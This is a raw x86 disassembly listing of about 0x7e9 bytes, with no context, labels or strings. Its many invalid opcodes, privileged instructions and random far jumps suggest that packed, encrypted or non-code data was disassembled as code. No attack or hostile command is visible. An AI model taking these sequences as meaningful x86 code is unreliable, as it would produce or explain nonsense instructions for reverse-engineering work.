  421d17:	cmp    eax,DWORD PTR [ecx]
  421d19:	es cwde 
  421d1b:	push   cs
  421d1c:	mov    esi,DWORD PTR [ebx+0x4dcac631]
  421d22:	and    edi,0xffffffac
  421d25:	push   ecx
  421d26:	push   eax
  421d27:	lahf   
  421d28:	test   eax,0xb34ac5b1
  421d2d:	dec    eax
  421d2e:	hlt    
  421d2f:	push   ebp
  421d30:	in     al,0x64
  421d32:	lods   eax,DWORD PTR ds:[esi]
  421d33:	mov    BYTE PTR [ebp-0x3d28f009],ah
  421d39:	mov    ds:0xaccc08ed,eax
  421d3e:	jle    0x421cc8
  421d40:	push   ss
  421d41:	xchg   esp,eax
  421d42:	(bad)  
  421d43:	pop    esi
  421d44:	sbb    al,0x4b
  421d46:	mov    ds:0xd1dedefe,eax
  421d4b:	dec    eax
  421d4c:	or     eax,0x868e869a
  421d51:	mov    ds:0xf6ec709f,al
  421d56:	sub    eax,0x5d86b3e4
  421d5b:	stc    
  421d5c:	enter  0x57e2,0x7
  421d60:	jae    0x421d67
  421d62:	frstor [eax-0x2e0f8e7]
  421d68:	mov    cl,0xfb
  421d6a:	push   0x323649c5
  421d6f:	imul   ebp,DWORD PTR [edi-0x25],0x27
  421d73:	adc    BYTE PTR [ebp-0x1],dl
  421d76:	jbe    0x421d97
  421d78:	aam    0x7f
  421d7a:	xor    DWORD PTR [esi+0x660745fb],edi
  421d80:	dec    ecx
  421d81:	sbb    al,0x65
  421d83:	bound  ebp,QWORD PTR [eax-0x3e]
  421d86:	outs   dx,DWORD PTR ds:[esi]
  421d87:	dec    edi
  421d88:	icebp  
  421d89:	push   esi
  421d8a:	jle    0x421d8e
  421d8c:	adc    al,0x7e
  421d8e:	arpl   WORD PTR [edx],bx
  421d90:	nop
  421d91:	xchg   ebx,eax
  421d92:	xchg   esi,eax
  421d93:	repnz popa 
  421d95:	dec    esp
  421d96:	fcom   QWORD PTR [ebp+0x13]
  421d99:	cmc    
  421d9a:	fwait
  421d9b:	(bad)  
  421d9c:	iret   
  421d9d:	sar    BYTE PTR [ecx],0x78
  421da0:	jbe    0x421d48
  421da2:	pop    eax
  421da3:	push   ds
  421da4:	fadd   DWORD PTR [esi-0x7f511217]
  421daa:	dec    edi
  421dab:	cmp    ebp,0x3b
  421dae:	pusha  
  421daf:	adc    eax,0xf7a6dd50
  421db4:	rcr    DWORD PTR [edx-0x267972dc],0x89
  421dbb:	loope  0x421d6a
  421dbd:	ror    DWORD PTR [ecx+0x74948184],0x4e
  421dc4:	adc    DWORD PTR [edx-0x23],ebp
  421dc7:	push   esi
  421dc8:	inc    edi
  421dc9:	sbb    BYTE PTR [ecx+0x62],al
  421dcc:	jae    0x421de9
  421dce:	xchg   edx,eax
  421dcf:	xchg   edi,eax
  421dd0:	sub    esp,DWORD PTR [esi]
  421dd2:	out    0xc9,al
  421dd4:	and    al,0x75
  421dd6:	xor    ebx,DWORD PTR [edi]
  421dd8:	or     BYTE PTR [ecx-0x78],dl
  421ddb:	add    al,0x38
  421ddd:	sub    DWORD PTR [ecx],esi
  421ddf:	daa    
  421de0:	and    edx,eax
  421de2:	stos   DWORD PTR es:[edi],eax
  421de3:	repnz sbb eax,0x732f42cc
  421de9:	xor    BYTE PTR [ebp-0x2e3d5d0c],0xef
  421df0:	(bad)  
  421df1:	cmp    eax,0xa98407e3
  421df6:	jl     0x421d9b
  421df8:	pop    esp
  421df9:	stos   BYTE PTR es:[edi],al
  421dfa:	popf   
  421dfb:	cmp    al,dh
  421dfd:	mov    dh,BYTE PTR [ebx-0x56ff1b72]
  421e03:	mov    bh,0x84
  421e05:	lahf   
  421e06:	sbb    cl,ch
  421e08:	add    eax,0xd00a4340
  421e0d:	dec    esi
  421e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e0f:	mov    al,ds:0x41e5d1ad
  421e14:	outs   dx,DWORD PTR ds:[esi]
  421e15:	rcr    BYTE PTR [ebx-0x36],0xd6
  421e19:	enter  0x47ee,0xe4
  421e1d:	xlat   BYTE PTR ds:[ebx]
  421e1e:	push   ecx
  421e1f:	int3   
  421e20:	les    edx,FWORD PTR [edx+0x1543c27a]
  421e26:	(bad)  
  421e27:	popa   
  421e28:	hlt    
  421e29:	shr    DWORD PTR [ebp-0x2f0e2683],0x57
  421e30:	cmp    DWORD PTR [edx+0x2ecf0ec1],0x35
  421e37:	mov    ds:0x1a2048ba,al
  421e3c:	sbb    DWORD PTR [esi],eax
  421e3e:	mov    ah,0x1e
  421e40:	adc    eax,0x3c74c863
  421e45:	jmp    0x421e31
  421e47:	pop    es
  421e48:	push   edi
  421e49:	jb     0x421e1e
  421e4b:	pushf  
  421e4c:	retf   
  421e4d:	data16 sbb dl,BYTE PTR [ebp-0xacea21c]
  421e54:	xlat   BYTE PTR ds:[ebx]
  421e55:	cmc    
  421e56:	popa   
  421e57:	ret    
  421e58:	jae    0x421e7a
  421e5a:	mov    esp,0x9e383127
  421e5f:	ds mov ecx,0xe83fbb53
  421e65:	fdivr  QWORD PTR [edi+0x27]
  421e68:	cmp    al,0x94
  421e6a:	cmp    DWORD PTR [ebx+0x5f],0x5da4d93c
  421e71:	xor    BYTE PTR ds:0xf4f55b7f,ah
  421e77:	popf   
  421e78:	test   eax,0x2870cf31
  421e7d:	inc    eax
  421e7e:	sub    ecx,0xbc002bba
  421e84:	les    esi,FWORD PTR [ecx]
  421e86:	ins    DWORD PTR es:[edi],dx
  421e87:	das    
  421e88:	rol    DWORD PTR [edx+0x17],cl
  421e8b:	in     al,dx
  421e8c:	xchg   ebx,eax
  421e8d:	jo     0x421ec3
  421e8f:	sub    BYTE PTR ds:0x57489c41,0x7e
  421e96:	out    dx,al
  421e97:	mov    esi,0x5909513c
  421e9c:	daa    
  421e9d:	hlt    
  421e9e:	and    DWORD PTR [eax+0x1a683d1e],0x69
  421ea5:	add    bl,BYTE PTR [eax]
  421ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ea8:	imul   esp,DWORD PTR es:[ecx],0xffffff8b
  421eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ead:	jecxz  0x421e44
  421eaf:	fdivp  st(3),st
  421eb1:	test   eax,0xac204dfd
  421eb6:	mov    gs,WORD PTR [edx]
  421eb8:	jb     0x421f28
  421eba:	lods   eax,DWORD PTR ds:[esi]
  421ebb:	jno    0x421e96
  421ebd:	jae    0x421e66
  421ebf:	xchg   al,ah
  421ec1:	test   al,0xdd
  421ec3:	mov    ah,0xcd
  421ec5:	or     esp,esp
  421ec7:	cli    
  421ec8:	sub    edx,0xffffff82
  421ecb:	ds pop ecx
  421ecd:	mov    eax,0xe968a8d9
  421ed2:	push   es
  421ed3:	lock cmp DWORD PTR [edx+0x48d22481],0x7955e007
  421ede:	cmp    DWORD PTR [edi],ebx
  421ee0:	ds pop edx
  421ee2:	jns    0x421e67
  421ee4:	and    BYTE PTR [ebx-0xe],bl
  421ee7:	loope  0x421efb
  421ee9:	(bad)  
  421eea:	jae    0x421f5d
  421eec:	cmp    eax,0x33991e98
  421ef1:	sub    bl,al
  421ef3:	xchg   edx,eax
  421ef4:	pop    ss
  421ef5:	ins    DWORD PTR es:[edi],dx
  421ef6:	mov    dh,BYTE PTR [edi]
  421ef8:	fimul  WORD PTR [ebx]
  421efa:	pop    eax
  421efb:	push   0x63
  421efd:	shl    ch,1
  421eff:	imul   edi,DWORD PTR [ecx+0x5c8e7fd8],0xffffff9b
  421f06:	addr16 test ebx,edi
  421f09:	repnz ins BYTE PTR es:[edi],dx
  421f0b:	mov    esi,ecx
  421f0d:	jne    0x421f1d
  421f0f:	push   0xffffffb6
  421f11:	popf   
  421f12:	xchg   edx,eax
  421f13:	sbb    edi,eax
  421f15:	mov    ecx,0x75ca20f3
  421f1a:	das    
  421f1b:	aam    0x82
  421f1d:	dec    eax
  421f1e:	cmp    eax,ebx
  421f20:	jns    0x421f28
  421f22:	js     0x421ec6
  421f24:	jno    0x421f06
  421f26:	adc    dh,BYTE PTR [ebx+ebp*8+0x268ea05f]
  421f2d:	cld    
  421f2e:	test   ebx,0xd61a1aa
  421f34:	push   ecx
  421f35:	out    0x93,eax
  421f37:	dec    ebx
  421f38:	loop   0x421f82
  421f3a:	xor    eax,0xb37b8337
  421f3f:	loopne 0x421f31
  421f41:	repnz add edx,DWORD PTR [ebp-0x4a03dec2]
  421f48:	out    dx,eax
  421f49:	jl     0x421fbf
  421f4b:	dec    edx
  421f4c:	out    dx,eax
  421f4d:	fsubr  st(7),st
  421f4f:	jnp    0x421f70
  421f51:	hlt    
  421f52:	inc    eax
  421f53:	jb     0x421fd4
  421f55:	xchg   esp,eax
  421f56:	mov    al,0xfd
  421f58:	cli    
  421f59:	inc    ebx
  421f5a:	retf   0x34b0
  421f5d:	loope  0x421f8d
  421f5f:	fwait
  421f60:	scas   eax,DWORD PTR es:[edi]
  421f61:	dec    edx
  421f62:	ja     0x421f6e
  421f64:	sub    esp,DWORD PTR [eax]
  421f66:	daa    
  421f67:	aas    
  421f68:	adc    cl,dh
  421f6a:	mov    BYTE PTR [edi-0x57742109],ch
  421f70:	xor    eax,0x562b25db
  421f75:	icebp  
  421f76:	imul   ebp,DWORD PTR [edx],0xb6d168b
  421f7c:	jl     0x421f58
  421f7e:	ss mov cl,0x33
  421f81:	sti    
  421f82:	pusha  
  421f83:	mov    eax,0xefeefd57
  421f88:	iret   
  421f89:	xchg   edx,eax
  421f8a:	ret    0x191a
  421f8d:	dec    edi
  421f8e:	and    eax,0xf546d5bd
  421f93:	int3   
  421f94:	xchg   esi,eax
  421f95:	xchg   esp,eax
  421f96:	inc    edi
  421f97:	fsubr  st,st(5)
  421f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f9a:	clc    
  421f9b:	(bad)  
  421f9c:	ficomp WORD PTR [eax-0xbf75523]
  421fa2:	jnp    0x422008
  421fa4:	scas   eax,DWORD PTR es:[edi]
  421fa5:	cmovl  esp,DWORD PTR [si]
  421fa9:	add    eax,0xe22a5614
  421fae:	mov    cs,WORD PTR [esi]
  421fb0:	pushf  
  421fb1:	es push eax
  421fb3:	jnp    0x421fb0
  421fb5:	cmp    al,0xd
  421fb7:	jmp    0xff11:0x1eba3cbd
  421fbe:	jb     0x421f5a
  421fc0:	stos   DWORD PTR es:[edi],eax
  421fc1:	xchg   esi,eax
  421fc2:	jmp    0x421f8d
  421fc4:	aad    0x14
  421fc6:	icebp  
  421fc7:	dec    ebx
  421fc8:	std    
  421fc9:	or     ah,0x93
  421fcc:	sub    BYTE PTR [esi],ah
  421fce:	pop    eax
  421fcf:	ins    DWORD PTR es:[edi],dx
  421fd0:	out    dx,eax
  421fd1:	push   0x371bf480
  421fd6:	sub    DWORD PTR [eax+0x7632a95d],esi
  421fdc:	sbb    BYTE PTR [edx+0x7e],cl
  421fdf:	jae    0x421f9e
  421fe1:	xor    BYTE PTR [edx+0x50],dh
  421fe4:	pop    edi
  421fe5:	sti    
  421fe6:	les    eax,FWORD PTR [edx-0x5a128f17]
  421fec:	mov    ds:0x6142540,eax
  421ff1:	xlat   BYTE PTR ds:[ebx]
  421ff2:	enter  0xc6ed,0x56
  421ff6:	or     ch,BYTE PTR [esi+eax*8]
  421ff9:	mov    eax,ds:0x5ee7a397
  421ffe:	enter  0x4952,0x9d
  422002:	cmp    DWORD PTR ss:[esi],edi
  422005:	pop    ecx
  422006:	(bad)  
  422007:	fbstp  TBYTE PTR [ecx+esi*4-0x1e36ce34]
  42200e:	(bad)  
  42200f:	cld    
  422010:	sub    al,0x83
  422012:	(bad)  [ecx]
  422014:	aaa    
  422015:	ds mov edi,0xe03c9335
  42201b:	inc    esp
  42201c:	xchg   esp,eax
  42201d:	jmp    0x7a8c745b
  422022:	enter  0x6bea,0x25
  422026:	pop    esi
  422027:	push   ss
  422028:	mov    eax,0x46377ddc
  42202d:	or     dh,cl
  42202f:	push   edx
  422030:	push   0x478e55bb
  422035:	ds imul edi,edi,0x7b
  422039:	mov    esi,0xa95d5ddb
  42203e:	add    dl,BYTE PTR ds:0xe3ee63d
  422044:	mov    ebp,0x81d91776
  422049:	fcomi  st,st(0)
  42204b:	outs   dx,DWORD PTR ds:[esi]
  42204c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42204d:	retf   
  42204e:	cmp    eax,0xafeed593
  422053:	mov    eax,0x24cba2b3
  422058:	cli    
  422059:	push   es
  42205a:	nop
  42205b:	xchg   esi,eax
  42205c:	sahf   
  42205d:	sub    esi,ecx
  42205f:	aad    0xa4
  422061:	hlt    
  422062:	dec    edx
  422063:	aad    0x79
  422065:	mov    ds:0x30539833,eax
  42206a:	fmul   QWORD PTR [ecx+0x41d4a08b]
  422070:	cs push 0x1054cd3
  422076:	or     al,0x1e
  422078:	jecxz  0x4220ca
  42207a:	hlt    
  42207b:	std    
  42207c:	pop    ebx
  42207d:	mov    al,0xf8
  42207f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422080:	mov    ch,0xc2
  422082:	sub    bh,dl
  422084:	addr16 xchg edx,eax
  422086:	pop    ds
  422087:	xor    edi,DWORD PTR [esi]
  422089:	aas    
  42208a:	jae    0x422026
  42208c:	ss and al,0x7e
  42208f:	sub    eax,0xce8561b3
  422094:	imul   DWORD PTR [ebx]
  422096:	pusha  
  422097:	bound  ebx,QWORD PTR [edi]
  422099:	mov    ah,0x2
  42209b:	mov    ds:0x251523eb,al
  4220a0:	mov    ss,WORD PTR [edx]
  4220a2:	int    0xb2
  4220a4:	(bad)  
  4220a5:	adc    bh,BYTE PTR [edx+ebx*2-0x24]
  4220a9:	mov    ebp,0xcafc731e
  4220ae:	dec    esi
  4220af:	push   DWORD PTR [esi]
  4220b1:	fisubr DWORD PTR [ebp-0x7d]
  4220b4:	sbb    DWORD PTR [edi-0x5],ebx
  4220b7:	pop    ecx
  4220b8:	imul   ebp,DWORD PTR [edx-0x73789132],0xffffffbb
  4220bf:	mov    dh,0xe0
  4220c1:	imul   ebp,DWORD PTR [ecx+0x5b],0xfffffff1
  4220c5:	imul   esi,DWORD PTR [edi-0x597f763d],0x56
  4220cc:	sub    al,0x24
  4220ce:	imul   edx,DWORD PTR [ecx+0x1d],0xbdd2a123
  4220d5:	repnz nop
  4220d7:	test   BYTE PTR [esi],0x6a
  4220da:	aas    
  4220db:	push   ebp
  4220dc:	xchg   ebp,eax
  4220dd:	cld    
  4220de:	mov    dl,0xf
  4220e0:	aas    
  4220e1:	sub    edi,DWORD PTR [ebx+0x69a907de]
  4220e7:	lahf   
  4220e8:	loope  0x42213d
  4220ea:	pop    ecx
  4220eb:	push   esp
  4220ec:	dec    ebx
  4220ed:	inc    BYTE PTR [edx+0x57]
  4220f0:	cld    
  4220f1:	hlt    
  4220f2:	inc    ecx
  4220f3:	loop   0x422095
  4220f5:	xchg   dl,al
  4220f7:	push   ds
  4220f8:	sbb    BYTE PTR [ebx+0x50009960],dl
  4220fe:	data16 jnp 0x4220db
  422101:	push   cs
  422102:	adc    al,cl
  422104:	push   ebx
  422105:	add    eax,0x25caeebb
  42210a:	add    BYTE PTR [eax+0x52d28232],0x95
  422111:	xlat   BYTE PTR ds:[ebx]
  422112:	fisub  DWORD PTR [edx]
  422114:	bound  esi,QWORD PTR [ecx+esi*1+0xb504937]
  42211b:	adc    ebp,ebp
  42211d:	imul   edx,DWORD PTR [ebx+0x8031781],0x46
  422124:	mov    esp,0xdaf67b83
  422129:	mov    bl,0x9d
  42212b:	pop    ecx
  42212c:	sbb    eax,0x172dded9
  422131:	sbb    al,0x66
  422133:	cmp    al,ch
  422135:	in     al,dx
  422136:	add    al,0x4d
  422138:	out    dx,eax
  422139:	and    eax,DWORD PTR [ebx-0x55e81705]
  42213f:	mov    eax,ds:0x3a24a9d1
  422144:	push   eax
  422145:	pop    es
  422146:	xchg   esi,eax
  422147:	fxch   st(2)
  422149:	push   es
  42214a:	out    dx,eax
  42214b:	ds dec eax
  42214d:	dec    ecx
  42214e:	cmp    BYTE PTR [esp+eax*1+0x61d4090c],dh
  422155:	ds aad 0x6d
  422158:	aas    
  422159:	pop    esp
  42215a:	sub    BYTE PTR [eax],bh
  42215c:	sbb    ebx,ebx
  42215e:	cld    
  42215f:	dec    edi
  422160:	pop    esp
  422161:	fsubp  st(4),st
  422163:	push   0x50795527
  422168:	xor    eax,DWORD PTR [edx+0x12]
  42216b:	or     al,0x79
  42216d:	pop    ebp
  42216e:	jge    0x4221c2
  422170:	mov    edi,0x22d80e47
  422175:	and    al,0x30
  422177:	into   
  422178:	inc    esi
  422179:	gs mov dh,0x30
  42217c:	push   ss
  42217d:	mov    ecx,0xbc6b1216
  422182:	mov    dl,0x8
  422184:	cmp    al,0xda
  422186:	ret    
  422187:	cld    
  422188:	inc    eax
  422189:	mov    ds:0xc36de575,eax
  42218e:	repz (bad) 
  422190:	mov    ecx,0xf6c8eaef
  422195:	jp     0x4221a9
  422197:	cmp    al,0xdc
  422199:	sub    eax,0x39cf5823
  42219e:	pop    esp
  42219f:	sub    BYTE PTR [esi+ebx*4-0x36f096ce],dh
  4221a6:	push   ebx
  4221a7:	sub    BYTE PTR [eax+0x48],0x29
  4221ab:	and    BYTE PTR [eax-0xd025104],dh
  4221b1:	test   edx,ebx
  4221b3:	push   esp
  4221b4:	mov    eax,0x44227fa7
  4221b9:	or     eax,0x1852734b
  4221be:	test   ah,ch
  4221c0:	or     esi,DWORD PTR [ebp-0x56]
  4221c3:	jmp    0xc3e8f85c
  4221c8:	loopne 0x422241
  4221ca:	xchg   esi,eax
  4221cb:	into   
  4221cc:	mov    esi,0xefa32ca
  4221d1:	pop    ebx
  4221d2:	inc    ebx
  4221d3:	fist   DWORD PTR [eax-0x5fc3ee7f]
  4221d9:	sub    al,0x3a
  4221db:	repz add al,0x4f
  4221de:	(bad)  
  4221df:	int3   
  4221e0:	ror    DWORD PTR [edx+0x211a1d38],1
  4221e6:	push   0xffffff98
  4221e8:	js     0x42219a
  4221ea:	xchg   ecx,eax
  4221eb:	mov    gs,esp
  4221ed:	loopne 0x4221d4
  4221ef:	xchg   bl,ch
  4221f1:	and    cl,bl
  4221f3:	imul   ebx,DWORD PTR [ebx-0x58d045a],0xffffffcf
  4221fa:	cli    
  4221fb:	pop    esi
  4221fc:	add    bl,dl
  4221fe:	aaa    
  4221ff:	mov    ds:0xeffd156a,al
  422204:	dec    edi
  422205:	mov    esi,0x43bc8123
  42220a:	xor    eax,DWORD PTR cs:[edx-0x77]
  42220e:	push   esi
  42220f:	(bad)  
  422212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422213:	shl    al,0xde
  422216:	test   DWORD PTR [edi-0x35b8e4b],0xce9179b0
  422220:	ins    DWORD PTR es:[edi],dx
  422221:	inc    eax
  422222:	dec    eax
  422223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422224:	add    cl,bl
  422226:	jbe    0x42228d
  422228:	sti    
  422229:	lds    ecx,FWORD PTR [ebx]
  42222b:	pop    esp
  42222c:	push   es
  42222d:	(bad)  
  42222e:	repz mov ch,0x26
  422231:	jecxz  0x4221f6
  422233:	dec    esi
  422234:	add    DWORD PTR [ecx+0x418667d8],eax
  42223a:	pusha  
  42223b:	inc    esi
  42223c:	enter  0xe279,0x66
  422240:	jmp    0xd9f9:0x313e9d52
  422247:	enter  0xec46,0x3a
  42224b:	(bad)  [edi]
  42224d:	inc    ebx
  42224e:	icebp  
  42224f:	ret    
  422250:	xchg   DWORD PTR [esi],edx
  422252:	daa    
  422253:	(bad)  
  422254:	xchg   eax,esp
  422256:	nop
  422257:	mov    DWORD PTR [ebx],esp
  422259:	outs   dx,DWORD PTR ds:[esi]
  42225a:	(bad)  
  42225b:	inc    BYTE PTR [ecx-0x65]
  42225e:	jecxz  0x422207
  422260:	inc    eax
  422261:	aas    
  422262:	mov    ebp,0x7287086c
  422267:	pop    ds
  422268:	call   0xccbbaca8
  42226d:	inc    esp
  42226e:	(bad)  
  42226f:	into   
  422270:	pop    fs
  422272:	loop   0x4222e2
  422274:	mov    ch,BYTE PTR [eax]
  422276:	outs   dx,BYTE PTR ds:[esi]
  422277:	(bad)  [ecx-0x7bbc5d4]
  42227d:	out    0x80,al
  42227f:	add    DWORD PTR [ecx+0x3d],0x2e
  422283:	fdivr  DWORD PTR [edi-0x73]
  422286:	inc    DWORD PTR [esi-0x608f1316]
  42228c:	push   edi
  42228d:	jmp    0x422306
  42228f:	mov    cl,ah
  422291:	mov    BYTE PTR [ebx],bh
  422293:	pop    edi
  422294:	and    eax,esp
  422296:	dec    ebx
  422297:	jecxz  0x4222bc
  422299:	inc    esp
  42229a:	mov    ebx,0x4953bda8
  42229f:	(bad)  
  4222a0:	mov    ecx,0x99cb8d87
  4222a5:	stos   DWORD PTR es:[edi],eax
  4222a6:	push   esp
  4222a7:	(bad)
  4222ac:	retf   
  4222ad:	sbb    DWORD PTR ds:[bx+di],ebp
  4222b1:	sar    BYTE PTR [edx],0x2d
  4222b4:	push   ds
  4222b5:	sub    eax,0x2ac5a5dd
  4222ba:	push   ecx
  4222bb:	or     al,0xd2
  4222bd:	pop    ebx
  4222be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222bf:	ins    BYTE PTR es:[edi],dx
  4222c0:	out    0x39,al
  4222c2:	jno    0x422270
  4222c4:	shl    BYTE PTR [ebx],1
  4222c6:	ss xchg esp,eax
  4222c8:	pop    ebx
  4222c9:	pop    esp
  4222ca:	fcomp  QWORD PTR [eax-0x79]
  4222cd:	in     eax,0x7c
  4222cf:	sbb    BYTE PTR [edi-0x50a073ba],0xf2
  4222d6:	loope  0x4222aa
  4222d8:	mov    esp,0x8af88b06
  4222dd:	cmp    eax,0xa28343a2
  4222e2:	sub    al,0x9a
  4222e4:	mov    cl,0x49
  4222e6:	mov    esi,0x515f3f28
  4222eb:	xchg   edi,eax
  4222ec:	lods   eax,DWORD PTR ds:[esi]
  4222ed:	mov    al,ds:0xcd27971b
  4222f2:	paddusw mm3,QWORD PTR [ebx]
  4222f5:	mov    ebx,0x5464c542
  4222fa:	pop    esp
  4222fb:	clc    
  4222fc:	hlt    
  4222fd:	mov    dl,0x77
  4222ff:	pusha  
  422300:	xchg   ebx,eax
  422301:	inc    eax
  422302:	loop   0x422305
  422304:	dec    edi
  422305:	aas    
  422306:	jmp    0x422309
  422308:	cmp    dl,BYTE PTR [ebp+0x64]
  42230b:	fwait
  42230c:	and    BYTE PTR [esi],dl
  42230e:	test   edx,esp
  422310:	ins    DWORD PTR es:[edi],dx
  422311:	pop    ecx
  422312:	pop    ss
  422313:	nop
  422314:	adc    edi,DWORD PTR [ebx+0x6aba19a7]
  42231a:	and    BYTE PTR ds:0xdebfbb23,ch
  422320:	sbb    DWORD PTR [eax],edx
  422322:	out    dx,eax
  422323:	lds    eax,FWORD PTR [eax-0x4b1de123]
  422329:	mov    eax,0xe6cb9ab0
  42232e:	dec    eax
  42232f:	cs jecxz 0x422348
  422332:	retf   0x255d
  422335:	sub    DWORD PTR [eax],ebx
  422337:	arpl   cx,bx
  422339:	jmp    0x9de6:0xd1ee6d95
  422340:	xchg   BYTE PTR [eax+0x3a3e9cbc],dh
  422346:	xor    al,0xfc
  422348:	xchg   DWORD PTR [ecx-0x78],esi
  42234b:	inc    ebp
  42234c:	in     al,0x84
  42234e:	pop    ds
  42234f:	inc    esi
  422350:	sar    ecx,cl
  422352:	ret    0x49e
  422355:	mov    edx,0x5cdb9ca2
  42235a:	sar    DWORD PTR [ebx],1
  42235c:	(bad)  
  42235d:	sahf   
  42235e:	outs   dx,DWORD PTR ds:[esi]
  42235f:	sub    ah,BYTE PTR [eax-0x4]
  422362:	ret    
  422363:	out    0x8c,eax
  422365:	inc    ebx
  422366:	pop    edi
  422367:	mov    bh,0x1f
  422369:	cwde   
  42236a:	inc    edx
  42236b:	adc    DWORD PTR [esi+0x44],esi
  42236e:	hlt    
  42236f:	aad    0x6e
  422371:	xchg   ebx,eax
  422372:	out    0xdc,al
  422374:	test   eax,0xa4fd1324
  422379:	xor    ebx,ecx
  42237b:	sub    ch,BYTE PTR [eax+0x2c0093b4]
  422381:	leave  
  422382:	aas    
  422383:	icebp  
  422384:	xchg   esp,eax
  422385:	adc    eax,0x3abec7cb
  42238a:	sbb    BYTE PTR [eax-0x3a],al
  42238d:	xchg   esp,ecx
  42238f:	test   eax,0x3eb1f954
  422394:	aam    0xa5
  422396:	mul    BYTE PTR [edx-0x7756967e]
  42239c:	les    edi,FWORD PTR [edi-0x466a6764]
  4223a2:	rol    DWORD PTR [ecx-0x64b6e753],1
  4223a8:	xlat   BYTE PTR ds:[ebx]
  4223a9:	dec    edi
  4223aa:	jmp    0x8f29:0xda26108e
  4223b1:	in     eax,dx
  4223b2:	cld    
  4223b3:	push   edx
  4223b4:	in     al,0xa1
  4223b6:	and    al,0x24
  4223b8:	gs gs enterw 0xbb14,0x5c
  4223bf:	mov    bh,0xe4
  4223c1:	loopne 0x422425
  4223c3:	push   edi
  4223c4:	aas    
  4223c5:	clc    
  4223c6:	add    esi,edi
  4223c8:	call   0x585e:0x670e70f5
  4223cf:	mov    esi,0x36add7b1
  4223d4:	std    
  4223d5:	xor    eax,0x7b25b826
  4223da:	dec    eax
  4223db:	mov    ah,0x1a
  4223dd:	stc    
  4223de:	fcom   DWORD PTR [edx+0x3040a1c9]
  4223e4:	pop    edx
  4223e5:	arpl   bx,bx
  4223e7:	and    dl,BYTE PTR [eax+0x6923bf92]
  4223ed:	pop    ss
  4223ee:	scas   al,BYTE PTR es:[edi]
  4223ef:	pushf  
  4223f0:	aaa    
  4223f1:	cli    
  4223f2:	mov    ds:0x1395bb74,al
  4223f7:	and    dl,BYTE PTR [edx-0x7aba3424]
  4223fd:	rcr    DWORD PTR [eax+ecx*8+0x515d3f14],cl
  422404:	push   ebx
  422405:	mov    ds:0x5d532b47,eax
  42240a:	jno    0x4223e0
  42240c:	push   ebp
  42240d:	les    esi,FWORD PTR [ebx-0x40]
  422410:	sbb    al,0x4
  422412:	pop    ebx
  422413:	stos   BYTE PTR es:[edi],al
  422414:	mov    ah,0xdf
  422416:	and    BYTE PTR [ecx],cl
  422418:	cmp    esp,ebx
  42241a:	test   al,0xd8
  42241c:	ja     0x422442
  42241e:	and    al,0xaf
  422420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422421:	add    al,0x98
  422423:	xchg   edi,eax
  422424:	add    DWORD PTR [esi+ebx*2-0x70],ebx
  422428:	idiv   ebp
  42242a:	adc    ch,BYTE PTR [edi-0x33]
  42242d:	js     0x422488
  42242f:	in     eax,0x3d
  422431:	mul    dl
  422433:	xchg   edx,eax
  422434:	jl     0x4223fe
  422436:	out    dx,al
  422437:	gs pop esp
  422439:	mov    ds:0x75c6351f,eax
  42243e:	adc    dh,bh
  422440:	push   DWORD PTR [ebx-0x7055f54c]
  422446:	xchg   edi,eax
  422447:	push   ebx
  422448:	xchg   esi,eax
  422449:	xchg   ebx,eax
  42244a:	lods   al,BYTE PTR ds:[esi]
  42244b:	js     0x4224b9
  42244d:	iret   
  42244e:	je     0x422481
  422450:	aad    0xf9
  422452:	sbb    esi,esi
  422454:	add    eax,0x659ff871
  422459:	mov    ah,0xe1
  42245b:	stos   BYTE PTR es:[edi],al
  42245c:	xor    ah,dl
  42245e:	cs xchg esp,eax
  422460:	std    
  422461:	test   ebx,ebx
  422463:	xor    esp,esp
  422465:	icebp  
  422466:	test   al,0xda
  422468:	fdivr  QWORD PTR [eax+0x49]
  42246b:	hlt    
  42246c:	lds    ebx,FWORD PTR [eax+edi*8-0x77176188]
  422473:	fwait
  422474:	push   edx
  422475:	xor    edx,DWORD PTR [esi]
  422477:	xor    al,0x6
  422479:	push   ebx
  42247a:	(bad)  
  42247b:	cmp    ah,ah
  42247d:	jmp    0x4224f4
  42247f:	adc    al,BYTE PTR [ebx+0x63]
  422482:	jg     0x42243c
  422484:	dec    edx
  422485:	fstp   QWORD PTR [esi+edi*4-0x3691d4b6]
  42248c:	push   ds
  42248d:	lock mov eax,ds:0xfef1f4e6
  422493:	mov    ebx,0x5a8479e4
  422498:	(bad)  
  422499:	das    
  42249a:	or     eax,DWORD PTR ds:0xd6db777f
  4224a0:	xchg   ebx,eax
  4224a1:	ja     0x4224b7
  4224a3:	pop    ds
  4224a4:	std    
  4224a5:	arpl   WORD PTR ds:0xdf4ba3a6,dx
  4224ab:	outs   dx,DWORD PTR ds:[esi]
  4224ac:	push   eax
  4224ad:	fcmovbe st,st(7)
  4224af:	jecxz  0x4224fd
  4224b1:	aaa    
  4224b2:	nop
  4224b3:	xchg   esi,eax
  4224b4:	fisttp QWORD PTR [ebp+eiz*1+0x7b]
  4224b8:	jae    0x4224a9
  4224ba:	sub    edx,DWORD PTR [esi]
  4224bc:	adc    eax,0x1e4ede2c
  4224c1:	pop    esp
  4224c2:	or     DWORD PTR [edi+0x39],0xd2a0a1a5
  4224c9:	mov    dh,0x9b
  4224cb:	mov    ch,0x9e
  4224cd:	inc    ecx
  4224ce:	lahf   
  4224cf:	imul   ebp,DWORD PTR [edi-0x65],0xdf25f5f8
  4224d6:	ret    0x8afc
  4224d9:	sub    dl,BYTE PTR es:[edx-0x706c44ae]
  4224e0:	adc    BYTE PTR [edx],dh
  4224e2:	daa    
  4224e3:	xor    eax,0xa574ba71
  4224e8:	(bad)  
  4224e9:	arpl   WORD PTR [esi-0x4c],sp
  4224ec:	int    0xa3
  4224ee:	sub    al,ah
  4224f0:	inc    ebx
  4224f1:	or     al,BYTE PTR [esi-0x5fac2c37]
  4224f7:	lahf   
  4224f8:	dec    esp
  4224f9:	call   0x69f0708e
  4224fe:	cmp    dh,cl
  422500:	jnp    0x422494
